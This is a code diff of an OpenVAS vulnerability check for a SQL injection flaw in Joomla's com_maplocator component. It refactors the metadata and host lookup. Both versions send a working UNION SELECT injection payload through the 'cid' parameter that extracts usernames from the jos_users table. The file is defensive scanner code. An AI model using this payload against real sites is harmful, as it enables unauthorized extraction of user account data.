@@ -1,8 +1,8 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_joomla_maplocator_sql_inj_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
+# $Id: secpod_joomla_maplocator_sql_inj_vuln.nasl 10471 2018-07-09 15:14:32Z ckuersteiner $
 #
-# Joomla Component 'com_maplocator' SQL Injection Vulnerability 
+# Joomla Component 'com_maplocator' SQL Injection Vulnerability
 #
 # Authors:
 # Madhuri D <dmadhuri@secpod.com>
@@ -24,35 +24,18 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_impact = "Successful exploitation will let attackers to conduct SQL Injection
-attacks and gain sensitive information.
-
-Impact Level: Application.";
-
-tag_affected = "Joomla com_maplocator component";
-
-tag_insight = "The flaw is caused by improper validation of user-supplied input
-via the 'cid' parameter in 'index.php', which allows attacker to manipulate
-SQL queries by injecting arbitrary SQL code.";
-
-tag_solution = "No solution or patch was made available for at least one year
-since disclosure of this vulnerability. Likely none will be provided anymore.
-General solution options are to upgrade to a newer release, disable respective
-features, remove the product or replace the product by another one.";
-
-tag_summary = "This host is running Joomla with com_maplocator component and is
-prone to SQL injection vulnerability.";
+CPE = "cpe:/a:joomla:joomla";
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902375");
-  script_version("$Revision: 9351 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
+  script_version("$Revision: 10471 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-07-09 17:14:32 +0200 (Mon, 09 Jul 2018) $");
   script_tag(name:"creation_date", value:"2011-06-01 11:16:16 +0200 (Wed, 01 Jun 2011)");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_name("Joomla Component 'com_maplocator' SQL Injection Vulnerability");
 
+  script_name("Joomla Component 'com_maplocator' SQL Injection Vulnerability");
 
   script_tag(name:"qod_type", value:"remote_vul");
   script_category(ACT_ATTACK);
@@ -60,40 +43,51 @@ if(description)
   script_family("Web application abuses");
   script_dependencies("joomla_detect.nasl");
   script_require_ports("Services/www", 80);
-  script_mandatory_keys("joomla/installed");
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
+  script_mandatory_keys("joomla/install
+ed");
+
+  script_tag(name:"impact", value:"Successful exploitation will let attackers to conduct SQL Injection attacks
+and gain sensitive information.");
+
+  script_tag(name:"affected", value:"Joomla com_maplocator component");
+
+  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input via the
+'cid' parameter in 'index.php', which allows attacker to manipulate SQL queries by injecting arbitrary SQL code.");
+
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
+disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
+a newer release, disable respective features, remove the product or replace the product by another one.");
+
+  script_tag(name:"summary", value:"This host is running Joomla with com_maplocator component and is prone to
+SQL injection vulnerability.");
+
   script_tag(name:"solution_type", value:"WillNotFix");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101608/joomlamaplocator-sql.txt");
+
+  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101608/joomlamaplocator-sql.txt");
+
   exit(0);
 }
 
-
+include("host_details.inc");
 include("http_func.inc");
-include("version_func.inc");
+include("http_keepalive.inc");
 
-## Check the default port
-joomlaPort = get_http_port(default:80);
-if(!joomlaPort){
+if (!port = get_app_port(cpe:CPE))
+  exit(0);
+
+if (!dir = get_app_location(cpe:CPE, port:port))
+  exit(0);
+
+if (dir == "/")
+  dir = "";
+
+url = dir + '/index.php?option=com_maplocator&view=state&cid=null+AND+1=0+union+select+1,2,concat(username,0x3a,' +
+            '0x4f70656e564153)fl0rix,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18+from+jos_users--';
+
+if (http_vuln_check(port: port, url: url, pattern: '>admin:OpenVAS')) {
+  report = report_vuln_url(port: port, url: url);
+  security_message(port: port, data: report);
   exit(0);
 }
 
-## Get the directory from KB
-if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
-  exit(0);
-}
-
-## Construct the attack string
-sndReq = http_get(item:string(joomlaDir, '/index.php?option=com_maplocator&' +
-         'view=state&cid=null+AND+1=0+union+select+1,2,concat(username,0x3a,' +
-         '0x4f70656e564153)fl0rix,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18+' +
-         'from+jos_users--'), port:joomlaPort);
-rcvRes = http_send_recv(port:joomlaPort, data:sndReq);
-
-## Confirm the exploit
-if('>admin:OpenVAS' >< rcvRes){
-    security_message(joomlaPort);
-}
+exit(99);
